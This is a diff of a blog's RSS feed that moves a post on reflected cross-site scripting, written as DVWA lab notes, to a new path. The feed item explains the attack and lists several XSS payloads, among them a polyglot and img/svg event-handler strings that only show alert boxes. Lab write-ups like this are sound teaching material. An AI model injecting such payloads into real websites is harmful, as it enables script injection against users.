@@ -11,9 +11,9 @@
     <atom:link href="http://192.168.1.130:1313/categories/web/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Reflected XSS</title>
-      <link>http://192.168.1.130:1313/posts/xss-reflected/</link>
+      <link>http://192.168.1.130:1313/dvwa/xss-reflected/</link>
       <pubDate>Tue, 24 Dec 2024 16:06:04 +0100</pubDate>
-      <guid>http://192.168.1.130:1313/posts/xss-reflected/</guid>
+      <guid>http://192.168.1.130:1313/dvwa/xss-reflected/</guid>
       <description>&lt;p&gt;Reflected XSS is an injection attack where malicious scripts are sent to a vulnerable web server (often via URLs), and the server immediately includes (reflects) those scripts unsanitized in the HTML response back to the victim&amp;rsquo;s browser, which then executes them. It relies on the server reflecting user input directly into the response page.&lt;/p&gt;&#xA;&lt;p&gt;Examples:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;javascript:/*--&amp;gt;&amp;lt;/title&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/xmp&amp;gt;&#xA;&amp;lt;svg/onload=&amp;#39;+/&amp;#34;`/+/onmouseover=1/+/[*/[]/+alert(42);//&amp;#39;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;IMG &amp;#34;&amp;#34;&amp;#34;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&amp;#34;XSS&amp;#34;)&amp;lt;/SCRIPT&amp;gt;&amp;#34;\&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;a href=&amp;#34;javascript:alert(String.fromCharCode(88,83,83))&amp;#34;&amp;gt;Click Me!&amp;lt;/a&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;IMG SRC=# onmouseover=&amp;#34;alert(&amp;#39;xxs&amp;#39;)&amp;#34;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;IMG SRC=/ onerror=&amp;#34;alert(String.fromCharCode(88,83,83))&amp;#34;&amp;gt;&amp;lt;/img&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;DVWA has 3 settings to show different levels of security. Below are the bypasses for each level.&lt;/p&gt;</description>
     </item>
   </channel>
